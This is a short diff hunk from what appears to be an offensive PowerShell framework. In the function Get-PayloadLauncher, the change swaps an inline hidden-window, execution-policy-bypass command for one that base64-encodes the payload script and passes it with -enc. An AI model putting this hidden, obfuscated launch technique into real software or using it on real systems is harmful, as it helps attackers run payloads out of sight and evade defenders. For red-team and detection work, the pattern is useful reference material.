@@ -235,7 +235,8 @@ function Get-PayloadLauncher {
 
     switch ($Launcher) {
         'ps' {
-            return "powershell.exe -ep bypass -Window Hidden -c `"$Script`""
+            $_b64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Script))
+            return "powershell.exe -ep bypass -Window Hidden -enc $_b64"
         }
 
         'wmi' {
